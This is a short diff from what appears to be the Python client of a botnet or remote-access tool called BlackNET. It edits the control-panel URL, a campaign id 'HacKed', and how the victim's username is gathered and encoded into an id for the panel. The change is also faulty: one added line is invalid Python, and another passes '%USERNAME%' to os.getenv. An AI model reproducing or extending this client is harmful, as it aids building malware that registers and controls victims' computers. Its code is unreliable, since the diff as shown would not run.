@@ -6,11 +6,16 @@ import platform
 import base64
 import time
 
-PanelURL = "http://BlackNETPanelURL/blacknet/"
+PanelURL = "http://localhost/blacknet/"
 cid = "HacKed"
-username = os.getenv("USER")
-basecode =base64.urlsafe_b64encode(username.encode('UTF-8')).decode('ascii')
-uid = cid + "_" + basecode
+username = os.getenv("USERNAME")
+
+if os.name == "posix":
+   username = os.getenv("USER")
+elif os.name == "nt":
+    username = os.getenv("%USERNAME%")
+
+uid = cid + "_" + basecode = base64.urlsafe_b64encode(username.encode('UTF-8')).decode('ascii')
 
 if os.name == "posix":
       oss = "GNU/LINUX"
